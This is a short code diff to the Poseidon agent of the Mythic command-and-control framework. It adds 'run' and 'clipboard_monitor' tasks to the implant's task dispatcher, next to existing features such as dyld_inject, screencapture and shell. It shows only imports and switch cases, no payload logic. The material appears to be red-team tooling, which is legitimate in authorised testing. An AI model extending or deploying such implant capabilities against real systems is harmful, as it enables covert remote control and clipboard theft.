@@ -13,6 +13,7 @@ import (
 	// Poseidon
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/cat"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/cd"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/clipboard_monitor"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/cp"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/curl"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/download"
@@ -41,6 +42,7 @@ import (
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/ps"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pwd"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/rm"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/run"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/screencapture"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/setenv"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/shell"
@@ -123,6 +125,8 @@ var tasktypes = map[string]int{
 	"dyld_inject":       44,
 	"link_tcp":          45,
 	"unlink_tcp":        46,
+	"run":               47,
+	"clipboard_monitor": 48,
 	"none":              NONE_CODE,
 }
 
@@ -470,6 +474,12 @@ func handleNewTask() {
 				break
 			case 46:
 				go unlink_tcp.Run(task)
+				break
+			case 47:
+				go run.Run(task)
+				break
+			case 48:
+				go clipboard_monitor.Run(task)
 				break
 			case NONE_CODE:
 				// No tasks, do nothing
